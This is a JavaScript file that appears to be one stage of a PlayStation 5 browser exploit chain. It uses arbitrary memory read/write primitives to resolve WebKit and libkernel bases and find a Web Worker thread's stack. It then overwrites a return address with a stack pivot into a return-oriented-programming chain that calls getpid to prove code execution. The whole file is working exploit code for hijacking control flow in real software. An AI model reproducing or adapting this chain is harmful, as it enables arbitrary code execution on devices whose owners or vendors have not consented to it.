// worker_loop_1340.js — entry test WITHOUT longjmp.
// Chain: [getpid -> retval] then INFLOOP (worker spins, harmless leaked thread).
// If retval changes: entry + gadgets + stubs proven; exit discipline debugged separately.
// If tab dies: entry or gadget/LC address wrong (narrow next).
(async () => {
  const say = async (s) => { try { await log("[wloop] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const G = {poprdi:0x288B2n,poprsi:0x1EE7An,movrdi_rax:0x3881Fn,movrdi_rsi:0xC05B6n,poprsp:0xA1138n,ret:0xC7n,infloop:0x1553Dn};
  const POISON = 0x00C0FFEDEADBEEFn;
  let LC = 0n;
  for(const [slot,rva] of [[0x334E098,0x5D9E0],[0x334F680,0x5D9E0],[0x334F6A8,0x5D990],[0x3350850,0x14700]]){
    try{ const c=(read64(WK+BigInt(slot))-BigInt(rva))&0xFFFFFFFFFFFFn;
      if(c>0x800000000n&&c<0x900000000n&&c%0x4000n===0n){LC=c;break;} }catch(e){}
  }
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const retval = malloc(8), cbase = malloc(0x1000);
  const entry = cbase+0x100n;
  write64(retval, POISON);
  const Q = [];
  if((entry)&8n) Q.push(WK+G.ret);
  Q.push(LK+0x1B860n);
  Q.push(WK+G.poprdi); Q.push(retval); Q.push(WK+G.movrdi_rax);
  Q.push(WK+G.infloop);
  for(let i=0;i<Q.length;i++) write64(entry+BigInt(i*8), BigInt(Q[i]));
  const orig_ret = read64(retslot), orig_sp = read64(retslot+8n);
  await say("fire "+Q.length+"q lc="+hx(LC));
  write64(retslot, WK+G.poprsp);
  write64(retslot+8n, entry);
  try{
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),8000))]);
  }catch(e){}
  await sleep(800);
  let got = 0n;
  try{ got = read64(retval); }catch(e){}
  await say("retval="+hx(got)+" "+(got===POISON?"DID NOT RUN (entry/gadget/LC suspect)":"EXECUTED pid="+got+" (entry proven, fix exit next)"));
  try{ send_notification("wloop done"); }catch(e){}
})();
